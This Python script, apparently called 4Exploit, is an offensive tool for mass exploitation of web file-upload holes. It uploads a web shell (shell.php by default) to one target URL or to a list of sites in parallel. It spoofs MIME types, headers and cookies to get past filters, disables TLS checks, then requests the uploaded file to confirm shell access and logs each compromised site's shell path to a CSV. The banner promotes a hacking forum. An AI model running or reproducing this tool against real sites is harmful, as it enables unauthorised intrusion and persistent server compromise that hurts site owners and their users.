#!/bin/env python3

import sys, requests, argparse, time, os, csv, json, multiprocessing
from urllib.parse import urlparse

r = '\033[031m'
g = '\033[032m'
y = '\033[033m'
b = '\033[036m'
n = '\033[00m'
banner = r"""
  {r}____ {b}____        {n}   __     _ {g}__{n} 
 {r}/ / /{b}/ __/_ __ __{n}_  / /__  (_){g} /_{n}
{r}/_  _/{b} _/ \ \ // {n}_ \/ / _ \/ /{g} __/{n}
 {r}/_/{b}/___//_\_\/ .{n}__/_/\___/_/{g}\__/{n} 
             {b}/_/                 
 {r}MSF{b}: http://www.{n}mmsecurity.n{g}et/forum/member.php?action=register&referrer=9450{n}
		                 		{r}v1.0{n} 
""".format(r=r, g=g, b=b, n=n)
print(banner)

parser = argparse.ArgumentParser(description="4Exploit for file upload vulnerable websites")
parser.add_argument('-list', '-l', dest='list', help="The file that contain the target websites which is vulnerable.")
parser.add_argument('-output', '-O', dest='output', help="Output filename file ext -> .csv")
parser.add_argument('-query','-q', dest='query',required=True, help="This option is required for upload file parameter. eg. in HTML <input type=\"file\" name=\"*your query*\"/>")
parser.add_argument('-payload','-P', dest='payload', help="Hidden value will sometime be need while uploading the file. format -> '{\"name1\":\"value1\", \"name2\":\"value2\"}'")
parser.add_argument('-header','-H', dest='header', default='', help="The header that will be sent to server with a specific header. format -> '{\"User-Agent\": \"bot\",\"Content-Type\": \"image/jpeg\"}'")
parser.add_argument('-cookie','-C', dest='cookie', default='', help="Set the specific cookie to bypass. format -> '{\"val1\":\"key1\", \"val2\":\"key2\"}'")
parser.add_argument('-file','-f', dest='file', default='shell.php', help="This option is for your custom shell file.")
parser.add_argument('-type','-t', dest='type', default='application/x-php', help="MIME type that that will bypass some kind of filters. Default -> \"application/x-php\"")
parser.add_argument('-url','-u', dest='url', help="A target of that will be uploaded.")
parser.add_argument('-path','-p', dest='path', default='/', help="Uploaded file path. Only path remove the domain name. For access the shell easier. format -> /path/of/target Default : '/'")
parser.add_argument('-method','-X', dest='method', default='POST',help="Method for uploading file. default is POST")
args = parser.parse_args()
url = args.url if args.url else None
path = args.path if args.path else ""
file_type = args.type
lists = args.list if args.list else None
if url == None and lists == None:
	parser.print_usage()
	print('\t[ {y}REQUIRED{n} ] Either -list or -url required.'.format(y=y,n=n))
	sys.exit(1)
results = ["Process ID,Target,Method,Status Code,Responsed Hearders,Shell Access(PATH),Cookie,Requested Headers,Form-Queries,Date-Time"]
pay = args.payload if args.payload else {}
try:
	if type(pay) == dict:
		payload = pay
	else:
		payload = json.loads(pay)
	head = args.header if args.header else {}
	if type(head) == dict:
		headers = head
	else:
		headers = json.loads(head)
	cookie = args.cookie if args.cookie else {}
	if type(cookie) == dict:
		cookies = cookie
	else:
		cookies = json.loads(cookie)
except json.decoder.JSONDecodeError:
	print('\t[ {y}WARNING{n} ] Please write JSON format not Single quotes(\'), double quotes(\")'.format(y=y, n=n))
	sys.exit(1)
query = args.query
file = args.file
try:
	shell = {query: (file, open(file, 'rb'), file_type)}
except FileNotFoundError:
	print('\t[ %sWARNING%s ] No such file or directory: \'%s\'' % (y,n,file))
	sys.exit(1)
out = args.output if args.output else "out"
if out.split('.')[-1] != "csv":
	output = out+"_%s.csv" % time.strftime("%H:%M:%S_%d%m%Y")
else:
	output = out
method = args.method.upper()
def main(targets):
	try:
		if method == "POST":
			rq = requests.request("POST", targets.rstrip(), files=shell, data=payload, cookies=cookies, headers=headers, verify=False)	
		else:
			rq = requests.request(method, targets.rstrip(), files=shell, params=payload, cookies=cookies, headers=headers, verify=False)
	except requests.exceptions.ConnectionError:
		print('\t[ %sERROR%s ] Failed to establish a new connection to <%s>' % (r,n,targets.split(urlparse(targets).path)[0]))
		sys.exit(1)
	except TypeError:
		parser.print_usage()
		print('\t[ %sERROR%s ] Put all Key and Value in JSON format. Convert STRING even it\'s INTEGER. Like {"data": "0"}' % (r,n))
		sys.exit(1)
	if rq.ok:
		trg = targets.split(urlparse(targets).path)[0]+path+'/'+file
		try:
			sh = requests.request('GET', trg, verify=False)
		except requests.exceptions.ConnectionError:
			print('\t[ %sERROR%s ] While handling your website path, something went wrong. <%s>' % (r,n,trg))
			sys.exit(1)
		if sh.ok == False:
			print("\t[ %sWARNING%s ] File not found in given path. Some security filters may detect the shell. <%s><%d>" % (y,n,trg,sh.status_code))
			error_out = urlparse(targets).netloc+"_%s" % time.strftime("%H%M%S")
			f = open(error_out, 'a+')
			f.write(rq.text)
			f.close()
			sys.exit(1)
		else:
			print('\t[ %sDONE%s ] <%s> <%d>' % (g,n,trg, sh.status_code))
		#	No,Target,Method,Status Code,Responsed Hearders,Shell Access(PATH),Cookie,Requested Headers,Form-Queries,Date-Time
		if lists != None and bool(lists) and url == None:
			results.append("%d,%s,%s,%d,%s,%s,%s,%s,%s,%s" % (multiprocessing.current_process()._identity[0], targets,method,rq.status_code,rq.headers,"True"+"("+trg+")" if rq.ok else "False"+("Null"), cookies,headers,str(payload)+'('+query+')',time.strftime("%d/%m/%Y-<%H:%M:%S %p>")))
		elif url != None and bool(url) and lists == None:
			results.append("%d,%s,%s,%d,%s,%s,%s,%s,%s,%s" % (1, targets,method,rq.status_code,rq.headers,"True"+"("+trg+")" if rq.ok else "False"+("Null"), cookies,headers,str(payload)+'('+query+')',time.strftime("%d/%m/%Y-<%H:%M:%S %p>")))
		else:
			print('[ %sERROR%s ] Unknown error. Try Again!' % (r,n))
			sys.exit(1)
		out_csv()
	else:
		print(f'[ {r}ERROR{n} ] Unknown method replied from server. <{rq.status_code}>')
		sys.exit(1)
def out_csv():
	with open(output, 'a+', newline='') as file:
		w = csv.writer(file, delimiter='|')
		w.writerow(results[0].split(','))
		for result in results[1::]:
			w.writerow(result.split(','))
		file.close()
if url != None and bool(url) and lists == None:
	target = url
	main(target)
elif lists != None and bool(lists) and url == None:
	target = lists
	if os.path.exists(target):
		f = open(target, 'r')
		fp = f.readlines()
		try:
			p = multiprocessing.Pool(10)
			res = p.map_async(main, fp)
			p.close()
			p.join()
			p.terminate()
		except KeyboardInterrupt:
			p.terminate()
			print('\t[ %sERROR%s ] Keyboard Interruption detected. Exiting...' % (r,n))
			sys.exit(0)
		f.close()
else:
	parser.print_usage()
	print('\t[ {y}WARNING{n} ] Do not add both -lists and -url arguments.'.format(y=y,n=n))
	sys.exit(1)
